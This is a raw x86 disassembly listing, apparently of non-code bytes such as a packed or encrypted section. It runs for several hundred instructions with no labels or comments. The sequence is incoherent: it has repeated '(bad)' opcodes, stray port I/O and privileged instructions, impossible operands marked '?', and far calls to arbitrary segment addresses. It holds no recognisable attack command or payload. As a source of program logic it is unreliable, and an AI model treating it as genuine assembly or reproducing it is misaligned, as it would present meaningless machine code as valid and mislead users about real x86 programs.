  414643:	ficomp WORD PTR [edi+eax*8-0x4c75fa1]
  41464a:	dec    eax
  41464b:	aaa    
  41464c:	sub    eax,0xe8f691b3
  414651:	cs ss pop esp
  414654:	push   cs
  414655:	inc    ecx
  414656:	int3   
  414657:	mov    dh,0x54
  414659:	mov    esp,es
  41465b:	inc    ecx
  41465c:	xor    dl,BYTE PTR [edx-0x3d]
  41465f:	sahf   
  414660:	sbb    ch,ah
  414662:	xlat   BYTE PTR ds:[ebx]
  414663:	sbb    edi,DWORD PTR [eax]
  414665:	xchg   edx,eax
  414666:	cmp    al,0x59
  414668:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414669:	mov    edi,0x50cf183c
  41466e:	mov    esp,fs
  414670:	sub    al,BYTE PTR [edi-0x29413c88]
  414676:	jae    0x4146f0
  414678:	in     al,dx
  414679:	adc    eax,0x7f47c85e
  41467e:	pop    ebp
  41467f:	or     bl,dh
  414681:	(bad)
  414684:	cmp    ebp,edi
  414686:	pop    esp
  414687:	add    ch,dl
  414689:	dec    ecx
  41468a:	dec    ebp
  41468b:	sar    ah,0xc2
  41468e:	sbb    DWORD PTR [eax],esp
  414690:	jns    0x4146ed
  414692:	xor    eax,0x99da6c47
  414697:	outs   dx,BYTE PTR ds:[esi]
  414698:	dec    ebp
  414699:	pop    es
  41469a:	aad    0xfd
  41469c:	mov    ecx,0x4589a7e5
  4146a1:	inc    ebp
  4146a2:	lock aad 0x9c
  4146a5:	xor    al,0xe0
  4146a7:	pop    eax
  4146a8:	adc    eax,0x76f925c7
  4146ad:	imul   eax,DWORD PTR ds:0x3ee9568,0x5a
  4146b4:	dec    eax
  4146b5:	add    ah,al
  4146b7:	je     0x4146b9
  4146b9:	push   ebx
  4146ba:	push   ds
  4146bb:	xor    DWORD PTR [edi+0x46],edx
  4146be:	(bad)  
  4146bf:	std    
  4146c0:	adc    BYTE PTR [edi-0x80],dl
  4146c3:	mov    eax,0x2dbf6dc2
  4146c8:	sub    cl,BYTE PTR [ebx+0x4f]
  4146cb:	jg     0x414657
  4146cd:	mov    eax,0x99713b57
  4146d2:	sub    eax,0xc6a3d760
  4146d7:	sbb    eax,0x37d2b5c
  4146dc:	lock inc edi
  4146de:	loop   0x41469e
  4146e0:	mov    edx,0x7da4b0e4
  4146e5:	aas    
  4146e6:	and    esp,DWORD PTR [ecx+0x7d]
  4146e9:	scas   eax,DWORD PTR es:[edi]
  4146ea:	xchg   ebp,eax
  4146eb:	xor    al,0x6e
  4146ed:	jle    0x4146dd
  4146ef:	push   0x70
  4146f1:	test   DWORD PTR [edx],edi
  4146f3:	jo     0x414734
  4146f5:	test   al,0xf2
  4146f7:	inc    ebx
  4146f8:	pop    ecx
  4146f9:	cli    
  4146fa:	cmp    dl,BYTE PTR [eax+eax*2]
  4146fd:	in     al,dx
  4146fe:	inc    ebp
  4146ff:	pop    edi
  414700:	xor    DWORD PTR [ecx],ebx
  414702:	dec    ebx
  414703:	jecxz  0x4146d2
  414705:	popf   
  414706:	add    eax,0xef57ca88
  41470b:	pop    ds
  41470c:	out    0xd5,eax
  41470e:	mov    edx,0x229387f0
  414713:	mov    cl,0x88
  414715:	pop    ss
  414716:	xor    edi,esi
  414718:	jmp    0xd82e:0x24a3335f
  41471f:	aad    0x55
  414721:	push   ebx
  414722:	mov    bh,0x87
  414724:	retf   0x91cb
  414727:	dec    esp
  414728:	push   edi
  414729:	sbb    BYTE PTR [ebx+0x39395aa1],dl
  41472f:	sbb    WORD PTR [esi-0x23558e51],ax
  414736:	sub    ah,cl
  414738:	adc    al,0x55
  41473a:	loop   0x41475e
  41473c:	or     DWORD PTR [ecx+0x15],esi
  41473f:	xchg   ebx,eax
  414740:	int    0xfd
  414742:	adc    DWORD PTR [ecx+ebx*4-0x164f8f53],ebx
  414749:	xor    edx,0xf425c7ff
  41474f:	fdivr  st,st(6)
  414751:	loop   0x41476e
  414753:	mov    es,edi
  414755:	call   0xa306:0xdd135ae
  41475c:	mov    ch,0xba
  41475e:	cmp    DWORD PTR [eax+0x19a0967c],ebp
  414764:	lea    edx,[ebx]
  414766:	mov    cl,0x71
  414768:	mov    esp,?
  41476a:	imul   eax,DWORD PTR [ecx+eiz*2+0x72],0xffffffb1
  41476f:	dec    ebp
  414770:	pop    ds
  414771:	mov    eax,0xc7384953
  414776:	(bad)  
  414778:	sbb    DWORD PTR [eax-0x2c],ecx
  41477b:	mov    al,0xe6
  41477d:	add    BYTE PTR [edi+0x19],ch
  414780:	jmp    0x8c8b7ed7
  414785:	sbb    bh,cl
  414787:	mov    bh,0x9e
  414789:	call   0x5621b5af
  41478e:	ss js  0x4147bf
  414791:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414792:	leave  
  414793:	jns    0x414723
  414795:	lea    eax,[edi-0x6fb030f3]
  41479b:	adc    DWORD PTR es:[edi+0x547a0427],eax
  4147a2:	sub    edi,DWORD PTR [edi+0x7a]
  4147a5:	mov    es,ebx
  4147a7:	jae    0x41477d
  4147a9:	js     0x4147bf
  4147ab:	mov    ebx,ss
  4147ad:	mov    BYTE PTR [edx],ch
  4147af:	xor    ebp,edi
  4147b1:	(bad)  
  4147b2:	aam    0xb4
  4147b4:	and    ecx,DWORD PTR [ebx]
  4147b6:	xchg   esi,eax
  4147b7:	inc    esi
  4147b8:	sbb    BYTE PTR [eax+0x49688ae4],bh
  4147be:	test   al,0x16
  4147c0:	cdq    
  4147c1:	pushf  
  4147c2:	xchg   ebx,eax
  4147c3:	sbb    dl,BYTE PTR [edx+0x60]
  4147c6:	sbb    esp,ebx
  4147c8:	cmp    BYTE PTR [ebx+0x42],dl
  4147cb:	dec    eax
  4147cc:	inc    ebp
  4147cd:	inc    edx
  4147ce:	or     bh,bl
  4147d0:	fbld   TBYTE PTR [ecx-0x44b5db80]
  4147d6:	rcr    al,1
  4147d8:	stc    
  4147d9:	mov    ?,esp
  4147db:	or     eax,0xee194d47
  4147e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147e1:	adc    al,0x1d
  4147e3:	fsub   QWORD PTR [esi+ebp*8]
  4147e6:	pop    ebp
  4147e7:	fld    DWORD PTR [esi+0x3dad8807]
  4147ed:	sbb    BYTE PTR [edi+eax*4],cl
  4147f0:	int    0x7
  4147f2:	push   0x33769cb
  4147f7:	outs   dx,DWORD PTR ds:[esi]
  4147f8:	aas    
  4147f9:	inc    edi
  4147fa:	es ins DWORD PTR es:[edi],dx
  4147fc:	fwait
  4147fd:	arpl   WORD PTR [edi],ax
  4147ff:	leave  
  414800:	adc    edi,DWORD PTR [eax]
  414802:	fdiv   DWORD PTR ss:[ecx]
  414805:	inc    esi
  414806:	xor    al,0x98
  414808:	sbb    eax,0x7996f461
  41480d:	js     0x41480e
  41480f:	mov    cl,dl
  414811:	fxch   st(7)
  414813:	dec    esi
  414814:	daa    
  414815:	add    al,0xf4
  414817:	and    al,BYTE PTR [ecx]
  414819:	inc    eax
  41481a:	sbb    BYTE PTR gs:[esi+ebp*1-0x41fb7e41],al
  414822:	pop    ebx
  414823:	dec    ebx
  414824:	sub    bh,ch
  414826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414827:	jp     0x414866
  414829:	push   ds
  41482a:	and    BYTE PTR [edi+0xeb5e11d],0x9c
  414831:	dec    esi
  414832:	xor    al,0x2
  414834:	sbb    DWORD PTR [ebx],ebx
  414836:	jno    0x4148b2
  414838:	mov    ch,0xd4
  41483a:	sbb    al,0xab
  41483c:	test   al,0xe6
  41483e:	adc    al,0xf3
  414840:	in     eax,dx
  414841:	outs   dx,DWORD PTR ds:[esi]
  414842:	nop
  414843:	fistp  WORD PTR [ebx]
  414845:	xor    ecx,DWORD PTR [eax-0x36]
  414848:	adc    cl,bl
  41484a:	and    al,0x6e
  41484c:	inc    ecx
  41484d:	adc    BYTE PTR [edi-0x2b646d77],0xe3
  414854:	jae    0x414822
  414856:	and    ebx,edi
  414858:	jmp    0x4147f8
  41485a:	imul   edx,DWORD PTR [ecx-0x5a769247],0xa8960fea
  414864:	sbb    esp,DWORD PTR [ecx+0x17]
  414867:	mov    edi,0xabefe181
  41486c:	shl    cl,1
  41486e:	cmp    eax,DWORD PTR [esi-0x4c]
  414871:	cld    
  414872:	mov    edx,0x89cbfa08
  414877:	xor    DWORD PTR [ecx],eax
  414879:	outs   dx,BYTE PTR ds:[esi]
  41487a:	ins    DWORD PTR es:[edi],dx
  41487b:	sbb    eax,0xec9bb529
  414880:	jg     0x414848
  414882:	test   BYTE PTR [ebx],dl
  414884:	add    eax,0xda295a35
  414889:	inc    ecx
  41488a:	ret    
  41488b:	inc    esp
  41488c:	mov    esi,0x325268a6
  414891:	outs   dx,DWORD PTR ds:[esi]
  414892:	repnz mov dh,0x18
  414895:	fadd   QWORD PTR [esi-0x558a7859]
  41489b:	sub    al,0xc9
  41489d:	cmp    eax,0xe192974a
  4148a2:	xchg   edi,eax
  4148a3:	div    DWORD PTR [edx+0x3d0431a4]
  4148a9:	pop    ss
  4148aa:	dec    ecx
  4148ab:	add    al,0x25
  4148ad:	mov    bl,0xd6
  4148af:	add    DWORD PTR [esi],edx
  4148b1:	stc    
  4148b2:	outs   dx,BYTE PTR ds:[esi]
  4148b3:	push   0xba659c0e
  4148b8:	fwait
  4148b9:	sbb    eax,0x9455149e
  4148be:	jno    0x414927
  4148c0:	clc    
  4148c1:	xchg   BYTE PTR [edi],ah
  4148c3:	xchg   esi,eax
  4148c4:	int3   
  4148c5:	lahf   
  4148c6:	dec    BYTE PTR [esi]
  4148c8:	cld    
  4148c9:	xor    bl,BYTE PTR [edx+0x12]
  4148cc:	push   esp
  4148cd:	inc    eax
  4148ce:	push   edi
  4148cf:	mov    al,0x5b
  4148d1:	inc    eax
  4148d2:	cmp    al,0xc4
  4148d4:	pop    edx
  4148d5:	(bad)  
  4148d7:	fbld   TBYTE PTR [esi+0x10ebfb5]
  4148dd:	retf   0xac94
  4148e0:	and    eax,0x468a6406
  4148e5:	ror    BYTE PTR [eax+ecx*8],1
  4148e8:	lock (bad) 
  4148ea:	sub    ebx,DWORD PTR [ecx]
  4148ec:	lahf   
  4148ed:	stos   DWORD PTR es:[edi],eax
  4148ee:	or     al,0x3
  4148f0:	sbb    al,0x1a
  4148f2:	xchg   esi,eax
  4148f3:	fs call 0x17203ac9
  4148f9:	pop    edx
  4148fa:	and    al,0x90
  4148fc:	jp     0x414975
  4148fe:	inc    ebx
  4148ff:	(bad)  
  414900:	shr    DWORD PTR [ebp+0x36],1
  414903:	dec    esi
  414904:	loopne 0x4148d2
  414906:	aam    0x36
  414908:	cmp    ebx,DWORD PTR [ecx-0x1d]
  41490b:	sbb    BYTE PTR [edi+eiz*1],0x9f
  41490f:	gs cmp al,0xb8
  414912:	loopne 0x414992
  414914:	or     ch,bl
  414916:	pop    ebx
  414917:	push   edx
  414918:	jae    0x4148ac
  41491a:	popf   
  41491b:	jl     0x414930
  41491d:	call   0xb2bbe677
  414922:	xor    ecx,DWORD PTR [edi+0x79]
  414925:	push   0x58
  414927:	data16 arpl WORD PTR [eax],sp
  41492a:	test   BYTE PTR [eax-0x3b9bbe96],0x4e
  414931:	sbb    dl,dh
  414933:	ds pop edi
  414935:	lds    edi,FWORD PTR [esi-0x28f97001]
  41493b:	sti    
  41493c:	sbb    dh,BYTE PTR [ebx+0x50]
  41493f:	push   eax
  414940:	pop    ds
  414941:	or     al,0xa1
  414943:	push   es
  414944:	dec    ebx
  414945:	ins    BYTE PTR es:[edi],dx
  414946:	inc    ebx
  414947:	imul   esi,DWORD PTR [edi],0xffffffa3
  41494a:	jge    0x414969
  41494c:	or     DWORD PTR [edx],0x32
  41494f:	sbb    DWORD PTR [eax],eax
  414951:	mov    edx,0xeb4d7cc2
  414956:	fwait
  414957:	push   cs
  414958:	retf   
  414959:	js     0x41491d
  41495b:	dec    BYTE PTR [edi+0x5219e3bc]
  414961:	stc    
  414962:	inc    ebx
  414963:	loope  0x4149d9
  414965:	call   0xa125f9b9
  41496a:	ja     0x4148f9
  41496c:	xchg   ecx,eax
  41496d:	mov    al,0x58
  41496f:	mov    dh,0xcf
  414971:	imul   edx,ebx,0x99264f51
  414977:	push   eax
  414978:	or     BYTE PTR [ebp-0x1217bcfc],dl
  41497e:	(bad)  
  414980:	push   cs
  414981:	or     ah,cl
  414983:	and    BYTE PTR [edx-0x50],dh
  414986:	mov    esp,0x563cf57c
  41498b:	ficomp DWORD PTR [ebx+ecx*1+0x5]
  41498f:	stos   DWORD PTR es:[edi],eax
  414990:	int    0x5d
  414992:	lock adc DWORD PTR [ebx+0x24d8cdae],eax
  414999:	lea    eax,[ecx+0x3957ef07]
  41499f:	das    
  4149a0:	cmp    DWORD PTR [edx+0x62],edi
  4149a3:	repz pop edi
  4149a5:	je     0x41496d
  4149a7:	mov    esp,0x57d9167c
  4149ac:	sbb    bl,BYTE PTR [ebx+0x4]
  4149af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149b0:	cli    
  4149b1:	jbe    0x414a1e
  4149b3:	jle    0x414a08
  4149b5:	xchg   edx,eax
  4149b6:	(bad)  
  4149b7:	mov    edi,0x2893e15
  4149bc:	jge    0x414a0f
  4149be:	out    dx,al
  4149bf:	test   DWORD PTR [ecx+0x5f70bc65],0x4d82f957
  4149c9:	inc    esp
  4149ca:	mov    ecx,0x5d8414ce
  4149cf:	(bad)  
  4149d0:	out    0xd3,al
  4149d2:	or     DWORD PTR [ecx+ebp*1],eax
  4149d5:	cmp    DWORD PTR ss:[edx+0x22],edx
  4149d9:	sub    DWORD PTR [edx+0x2059db5b],ebx
  4149df:	mov    cl,0xb6
  4149e1:	mov    dl,0x13
  4149e3:	xchg   esi,eax
  4149e4:	call   0x3aa31e
  4149e9:	pop    edx
  4149ea:	cmp    al,BYTE PTR [ebx-0x59]
  4149ed:	mov    bh,0x6f
  4149ef:	cmp    BYTE PTR [ebx-0xa75a06],ch
  4149f5:	cs hlt 
  4149f7:	lea    eax,[edi-0x2c]
  4149fa:	cmp    al,0xd
  4149fc:	jg     0x4149da
  4149fe:	mov    eax,ds:0x44c637b5
  414a03:	xor    edx,ebp
  414a05:	mov    al,0x79
  414a07:	or     DWORD PTR [ecx-0x3b059759],eax
  414a0d:	shl    DWORD PTR [esi],0x27
  414a10:	test   eax,0x26280c17
  414a15:	imul   eax,DWORD PTR [eax-0x3d],0x6f
  414a19:	mov    BYTE PTR [eax-0xe],dh
  414a1c:	outs   dx,DWORD PTR ds:[esi]
  414a1d:	mov    esp,0x356df53e
  414a22:	cmp    al,0x14
  414a24:	(bad)  
  414a25:	(bad)  
  414a26:	hlt    
  414a27:	(bad)  
  414a28:	xor    esi,DWORD PTR [ebp+0x2d78fc80]
  414a2e:	mov    ds:0x19b0ed2a,eax
  414a33:	(bad)  
  414a34:	addr16 and bl,cl
  414a37:	outs   dx,BYTE PTR ds:[esi]
  414a38:	shr    DWORD PTR [esi],1
  414a3a:	cmp    BYTE PTR [eax],al
  414a3c:	fst    DWORD PTR [edi+0x54]
  414a3f:	dec    edi
  414a40:	in     al,dx
  414a41:	gs aas 
  414a43:	sub    BYTE PTR [ecx],bl
  414a45:	inc    esp
  414a46:	loop   0x414a8c
  414a48:	jge    0x414aad
  414a4a:	ins    DWORD PTR es:[edi],dx
  414a4b:	mov    eax,0x8e410249
  414a50:	push   es
  414a51:	mov    BYTE PTR [ebx-0x21a4c830],bh
  414a57:	addr16 or eax,0xf2e1d614
  414a5d:	dec    esp
  414a5e:	shr    esp,cl
  414a60:	int    0xea
  414a62:	jge    0x414aba
  414a64:	push   edi
  414a65:	jmp    0x414a59
  414a67:	pop    esi
  414a68:	int3   
  414a69:	imul   esi,esi,0xe01261b2
  414a6f:	ins    DWORD PTR es:[edi],dx
  414a70:	shl    DWORD PTR [esi-0x61],cl
  414a73:	push   eax
  414a74:	repz sub cl,ch
  414a77:	sahf   
  414a78:	fsubr  QWORD PTR [eax-0xa]
  414a7b:	xor    esp,ecx
  414a7d:	aaa    
  414a7e:	adc    DWORD PTR [ebx],ecx
  414a80:	aas    
  414a81:	shl    DWORD PTR [esi+edx*1-0x6f5fa252],0xf4
  414a89:	outs   dx,BYTE PTR ds:[esi]
  414a8a:	stos   BYTE PTR es:[edi],al
  414a8b:	std    
  414a8c:	sahf   
  414a8d:	hlt    
  414a8e:	push   es
  414a8f:	fmul   st(1),st
  414a91:	mov    al,0xb7
  414a93:	cmc    
  414a94:	xor    eax,0xfd4e0e60
  414a99:	mov    ch,0xd2
  414a9b:	es push ss
  414a9d:	lds    edx,FWORD PTR [ecx]
  414a9f:	out    0xba,eax
  414aa1:	das    
  414aa2:	dec    esi
  414aa3:	mov    al,0x28
  414aa5:	div    BYTE PTR [eax+0x23]
  414aa8:	push   ebp
  414aa9:	pop    eax
  414aaa:	push   eax
  414aab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414aac:	fmul   QWORD PTR [ebx+0x41]
  414aaf:	and    BYTE PTR fs:[esi+0x660876b5],ch
  414ab6:	dec    esp
  414ab7:	mov    dl,0x59
  414ab9:	mov    esi,0xfdc5002d
  414abe:	cmp    DWORD PTR [ebx-0x1b],esi
  414ac1:	adc    al,0x44
  414ac3:	cmp    eax,DWORD PTR [esi-0x75]
  414ac6:	sbb    DWORD PTR [edx],edx
  414ac8:	add    BYTE PTR [edx+0x55079198],ah
  414ace:	out    0x16,eax
  414ad0:	sub    BYTE PTR [edx],bl
  414ad2:	scas   eax,DWORD PTR es:[edi]
  414ad3:	je     0x414b35
  414ad5:	add    ah,BYTE PTR [esi+0x3527caa7]
  414adb:	ds dec esp
  414add:	cli    
  414ade:	lea    esp,[ebx+0x29a0d0e2]
  414ae4:	mov    bl,BYTE PTR [eax+ecx*1]
  414ae7:	std    
  414ae8:	mov    edi,0x4fa03e9e
  414aed:	test   al,0x44
  414aef:	loopne 0x414b5e
  414af1:	cmp    al,cl
  414af3:	arpl   WORD PTR [ecx+0x7d],si
  414af6:	(bad)  
  414af7:	jmp    0x414b41
  414af9:	inc    edi
  414afa:	stos   BYTE PTR es:[edi],al
  414afb:	mov    bh,0x50
  414afd:	xor    ah,ah
  414aff:	stos   DWORD PTR es:[edi],eax
  414b00:	je     0x414b29
  414b02:	push   eax
  414b03:	xchg   esi,eax
  414b04:	and    al,dh
  414b06:	stos   DWORD PTR es:[edi],eax
  414b07:	in     al,dx
  414b08:	call   0x3f9:0x8afb7dd0
  414b0f:	sbb    eax,0xd4763d9f
  414b14:	xor    eax,DWORD PTR [esi]
  414b16:	push   eax
  414b17:	xlat   BYTE PTR ds:[ebx]
  414b18:	or     ah,BYTE PTR [esi+esi*2+0x438a5ed2]
  414b1f:	test   eax,0xc8108bcb
  414b24:	sub    DWORD PTR [ebx+edx*4-0x74],0xa922317a
  414b2c:	sbb    eax,0xaabe25ee
  414b31:	out    0x3e,eax
  414b33:	fidiv  WORD PTR [edx-0x10]
  414b36:	xor    dl,BYTE PTR gs:[edx+0x2cd899d6]
  414b3d:	ret    0xf573
  414b40:	jmp    0x414b89
  414b42:	fidivr DWORD PTR [ecx]
  414b44:	mov    BYTE PTR [edi-0x7a],ch
  414b47:	or     edi,DWORD PTR [eax+eax*1]
  414b4a:	xchg   edi,edi
  414b4c:	pushf  
  414b4d:	leave  
  414b4e:	cmp    eax,0x922dfbd6
  414b53:	loop   0x414bb9
  414b55:	sar    BYTE PTR ds:0x9736ee34,cl
  414b5b:	mov    ch,0x32
  414b5d:	adc    DWORD PTR [ebx+0x58],eax
  414b60:	adc    al,0x81
  414b62:	popa   
  414b63:	gs clc 
  414b65:	jmp    0xfb8b:0x42f2bc67
  414b6c:	out    dx,eax
  414b6d:	add    dh,BYTE PTR [eax]
  414b6f:	data16 test al,0xa1
  414b72:	outs   dx,DWORD PTR ds:[esi]
  414b73:	test   al,0xc0
  414b75:	cmp    BYTE PTR [edi+0x72623746],ch
  414b7b:	mov    DWORD PTR [edx+0x7b],ebp
  414b7e:	xchg   edi,eax
  414b80:	xchg   DWORD PTR [ebp+0xe74c61d],eax
  414b86:	and    eax,DWORD PTR [eax-0x7b172ea6]
  414b8c:	sbb    eax,0xaece7bf3
  414b91:	inc    ecx
  414b92:	dec    eax
  414b93:	aas    
  414b94:	or     DWORD PTR [eax-0x4a],esi
  414b97:	xor    cl,bh
  414b99:	popa   
  414b9a:	fsub   QWORD PTR [ebx+0x7b]
  414b9d:	adc    al,0x9
  414b9f:	mov    WORD PTR [esi+0x45410a15],?
  414ba5:	xchg   ebx,eax
  414ba6:	sub    DWORD PTR [ebx-0x19],0xd5b4c0a1
  414bad:	inc    esi
  414bae:	pop    ss
  414baf:	xor    ecx,DWORD PTR [esi]
  414bb1:	stos   BYTE PTR es:[edi],al
  414bb2:	jns    0x414bbf
  414bb4:	sub    ah,dl
  414bb6:	sar    BYTE PTR ds:0x65eb9801,1
  414bbc:	rol    BYTE PTR [eax-0x17],1
  414bbf:	(bad)  
  414bc0:	mov    WORD PTR [edi],gs
  414bc2:	mov    esp,0xd8ebecb3
  414bc7:	pop    esp
  414bc8:	and    DWORD PTR [ecx+0x22],0xfffffff1
  414bcc:	icebp  
  414bcd:	out    0x85,al
  414bcf:	idiv   DWORD PTR [ecx-0x24]
  414bd2:	inc    esp
  414bd3:	lahf   
  414bd4:	jbe    0x414b9a
  414bd6:	ret    
  414bd7:	sub    al,0xdc
  414bd9:	outs   dx,DWORD PTR ds:[esi]
  414bda:	icebp  
  414bdb:	dec    ebp
  414bdc:	jb     0x414ba2
  414bde:	push   0x7b
  414be0:	daa    
  414be1:	fcmovbe st,st(3)
  414be3:	mov    al,ds:0x81668f99
  414be8:	xor    DWORD PTR [edx],ecx
  414bea:	test   BYTE PTR [ecx-0x61],bl
  414bed:	into   
  414bee:	mov    DWORD PTR [edi+0x9348c72],ebx
  414bf4:	dec    esp
  414bf5:	push   0x2b93850c
  414bfa:	ja     0x414bda
  414bfc:	jmp    0x414c40
  414bfe:	pop    esp
  414bff:	fidivr DWORD PTR [esi-0x71]
  414c02:	sbb    BYTE PTR [ebp-0x6d3c5cf1],0xfb
  414c09:	xchg   ebp,eax
  414c0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c0b:	sbb    BYTE PTR [edx],bh
  414c0d:	into   
  414c0e:	loope  0x414c1d
  414c10:	sbb    BYTE PTR [edi-0x7a],dh
  414c13:	cdq    
  414c14:	push   eax
  414c15:	xchg   BYTE PTR ds:0x3f7e9825,bh
  414c1b:	(bad)  
  414c1c:	adc    eax,0x1aa3204a
  414c21:	dec    edx
  414c22:	add    BYTE PTR [eax+0x30257b48],0x1c
  414c29:	ja     0x414bc3
  414c2b:	ja     0x414c25
  414c2d:	and    eax,0x4c09e5f1
  414c32:	mov    ecx,0xb201c39c
  414c37:	mov    edi,0xcf0ecfab
  414c3c:	ficom  WORD PTR [edi]
  414c3e:	call   0xf8df810e
  414c43:	inc    esi
  414c44:	cli    
  414c45:	dec    esi
  414c46:	mov    ebp,0xc1cf9e6
  414c4b:	inc    ecx
  414c4c:	lea    ebx,[ebp*1-0x531cf8ba]
  414c53:	bound  ecx,QWORD PTR [esi+0x4db6288d]
  414c59:	nop
  414c5a:	mov    ebp,0x1d10078e
  414c5f:	sbb    al,0xd3
  414c61:	fiadd  DWORD PTR [ebp+0x6c]
  414c64:	xchg   ebx,eax
  414c65:	stc    
  414c66:	cmp    eax,0x7c4489c0
  414c6b:	or     esi,DWORD PTR [esi-0x4d]
  414c6e:	adc    DWORD PTR [edx],edx
  414c70:	bound  esp,QWORD PTR [edx-0xf608f04]
  414c76:	out    dx,al
  414c77:	push   ecx
  414c78:	or     esi,DWORD PTR [edi]
  414c7a:	or     edi,DWORD PTR [ecx]
  414c7c:	iret   
  414c7d:	cld    
  414c7e:	mov    ebx,0x40305a7c
  414c83:	fstp   TBYTE PTR [edx-0x6391b55d]
  414c89:	outs   dx,DWORD PTR ds:[esi]
  414c8a:	pop    esi
  414c8b:	fsubrp st(0),st
  414c8d:	rol    DWORD PTR [eax],cl
  414c8f:	jle    0x414c46
  414c91:	pop    esi
  414c92:	jo     0x414cef
  414c94:	(bad)  
  414c95:	mov    edx,0x6311853b
  414c9a:	enter  0xa0f0,0x5e
  414c9e:	cdq    
  414c9f:	call   0x120c652b
  414ca4:	in     al,dx
  414ca5:	add    DWORD PTR [esi],eax
  414ca7:	mov    DWORD PTR [edi-0x3a],eax
  414caa:	dec    eax
  414cab:	js     0x414cbb
  414cad:	jmp    0x414cb8
  414caf:	cli    
  414cb0:	(bad)  
  414cb1:	push   esi
  414cb2:	mov    al,ds:0x6c773f12
  414cb7:	ret    0x7960
  414cba:	hlt    
  414cbb:	fisttp DWORD PTR [eax+ecx*8+0x44]
  414cbf:	sbb    cl,BYTE PTR [esi+0x5eed776]
  414cc5:	std    
  414cc6:	repnz sbb ebx,ecx
  414cc9:	aaa    
  414cca:	ins    BYTE PTR es:[edi],dx
  414ccb:	aad    0xb6
  414ccd:	rol    BYTE PTR [edx+0x6833ec7a],1
  414cd3:	test   eax,0x4013af1b
  414cd8:	cwde   
  414cd9:	out    0xc1,al
  414cdb:	jns    0x414d39
  414cdd:	(bad)  
  414cdf:	cmc    
  414ce0:	xchg   BYTE PTR [edi+edi*1],bh
  414ce3:	mov    ds:0x26ac725a,al
  414ce8:	mov    DWORD PTR [edi-0x6a],esp
  414ceb:	sub    eax,0x8ec6d733
  414cf0:	or     eax,0xaf8b19c7
  414cf5:	xor    al,0x44
  414cf7:	fwait
  414cf8:	popa   
  414cf9:	mov    ecx,0x4988ded7
  414cfe:	outs   dx,BYTE PTR ds:[esi]
  414cff:	pop    ss
  414d00:	cwde   
  414d01:	neg    ebp
  414d03:	pusha  
  414d04:	pop    ebx
  414d05:	cmp    esp,esi
  414d07:	mov    dl,0x1e
  414d09:	daa    
  414d0a:	push   edx
  414d0b:	lock sub eax,0x9afad8f0
  414d11:	ins    BYTE PTR es:[edi],dx
  414d12:	push   edi
  414d13:	pop    ebp
  414d14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d15:	imul   edi,DWORD PTR [eax],0x468c301c
  414d1b:	rcr    DWORD PTR [esi],cl
  414d1d:	test   BYTE PTR [edx+0x51696206],bh
  414d23:	sti    
  414d24:	lds    edx,FWORD PTR [eax+0x2c670731]
  414d2a:	out    dx,al
  414d2b:	jnp    0x414d98
  414d2d:	or     ah,al
  414d2f:	push   es
  414d30:	(bad)
  414d34:	jb     0x414d34
  414d36:	lods   al,BYTE PTR ds:[esi]
  414d37:	push   cs
  414d38:	test   DWORD PTR [eax],0xa6569ef6
  414d3e:	adc    bh,bh
  414d40:	rcl    DWORD PTR [edi+0x579f087f],1
  414d46:	iret   
  414d47:	clc    
  414d48:	pause  
  414d4a:	push   ebx
  414d4b:	xchg   edx,eax
  414d4c:	shl    BYTE PTR [ecx+0x6c],0x10
  414d50:	mov    fs,WORD PTR [edi+0x31]
  414d53:	push   edx
  414d54:	jle    0x414d3f
  414d56:	(bad)  [edi+0x31ddca1b]
  414d5c:	cmp    DWORD PTR [esi],esi
  414d5e:	pop    ecx
  414d5f:	loope  0x414d85
  414d61:	and    BYTE PTR [ebp-0x45e63377],al
  414d67:	sbb    esp,edx
  414d69:	and    eax,0x9eb5466d
  414d6e:	(bad)  
  414d6f:	ja     0x414da9
  414d71:	fwait
  414d72:	leave  
  414d73:	xor    ebp,edx
  414d75:	into   
  414d76:	iret   
  414d77:	cwde   
  414d78:	sub    DWORD PTR [edi+0x31],ebx
  414d7b:	lea    ebp,[edx+0x5a]
  414d7e:	(bad)  
  414d7f:	scas   eax,DWORD PTR es:[edi]
  414d80:	iret   
  414d81:	mov    ah,cl
  414d83:	out    dx,eax
  414d84:	jnp    0x414d6c
  414d86:	inc    edx
  414d87:	jge    0x414d95
  414d89:	pop    edi
  414d8a:	fild   QWORD PTR [edx+0xa]
  414d8d:	shl    BYTE PTR [ebx-0x6a],0x52
  414d91:	retf   0x510b
  414d94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d95:	aam    0x87
  414d97:	xchg   ebx,eax
  414d98:	adc    ch,BYTE PTR [ecx-0x6e]
  414d9b:	jns    0x414d21
  414d9d:	jno    0x414d70
  414d9f:	xchg   edi,eax
  414da0:	or     al,0x24
  414da2:	xchg   al,ch
  414da4:	or     dl,bl
  414da6:	cli    
  414da7:	dec    esp
  414da8:	mov    bl,0x50
  414daa:	mov    ebp,0x8be1cb40
  414daf:	test   DWORD PTR [ecx-0x15],0xf39d4711
  414db6:	enter  0x9eaa,0x39
  414dba:	dec    ebp
  414dbb:	test   DWORD PTR cs:[edi+0x3b317ae3],ebx
  414dc2:	inc    ebx
  414dc3:	sbb    BYTE PTR [eax+eax*2],dh
  414dc6:	cli    
  414dc7:	loopne 0x414d75
  414dc9:	inc    ebp
  414dca:	sbb    eax,0x4a8d9bce
  414dcf:	xor    eax,0x3a568906
  414dd4:	les    ecx,FWORD PTR [esi]
  414dd6:	call   0xf82c:0xaa1867a8
  414ddd:	dec    ebp
  414dde:	js     0x414d64
  414de0:	call   0x65838a49
  414de5:	jp     0x414e39
  414de7:	das    
  414de8:	fwait
  414de9:	(bad)
  414dec:	mov    al,ds:0x658d0226
  414df1:	mov    bl,0x67
  414df3:	(bad)  
  414df4:	arpl   WORD PTR [esi-0x33],bx
  414df7:	dec    esi
  414df8:	aaa    
  414df9:	fmul   st,st(0)
  414dfb:	mov    ds:0xcf0f2716,al
  414e00:	leave  
  414e01:	adc    ecx,DWORD PTR [ebx+0x4b156275]
  414e07:	sbb    DWORD PTR [edx-0x80efa3f],ecx
  414e0d:	or     bh,0x8
  414e10:	outs   dx,DWORD PTR ds:[esi]
